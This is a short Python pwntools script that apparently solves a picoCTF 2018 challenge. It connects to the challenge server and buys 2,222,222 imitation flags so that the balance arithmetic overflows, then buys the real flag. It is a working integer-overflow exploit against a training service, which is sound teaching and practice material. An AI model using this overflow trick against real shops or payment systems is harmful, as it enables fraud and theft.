from pwn import *

r = remote("2018shell3.picoctf.com", 60893)

MENU_BALANCE = "1"
MENU_BUY = "2"
MENU_EXIT = "3"

FLAG_IMITATION = "1"
FLAG_REAL = "2"

BUY_REAL_FLAG = "1"

def menu(choice):
    r.sendlineafter("Enter a menu selection\n", str(choice))

def check_balance():
    menu(MENU_BALANCE)
    print r.recvregex("Balance: \d+ \n").strip()

def buy_imitation_flag(amount):
    menu(MENU_BUY)
    log.info("Attempting to buy {} imitation flags".format(amount))
    r.sendlineafter("[2] Real Flag\n", FLAG_IMITATION)
    r.sendlineafter("Imitation Flags cost 1000 each, how many would you like?", str(amount))
    print r.recvregex("Your new balance: \d+\n").strip()

def buy_real_flag():
    menu(MENU_BUY)
    log.info("Attempting to buy a real flag")
    r.sendlineafter("[2] Real Flag\n", FLAG_REAL)
    r.sendlineafter("Enter 1 to purchase", BUY_REAL_FLAG) 
    line = r.recvline()
    print line
    if "FLAG" not in line:
        print r.recvline()

def exit():
    menu(MENU_EXIT)

check_balance()
buy_imitation_flag(2222222)
buy_real_flag()
exit()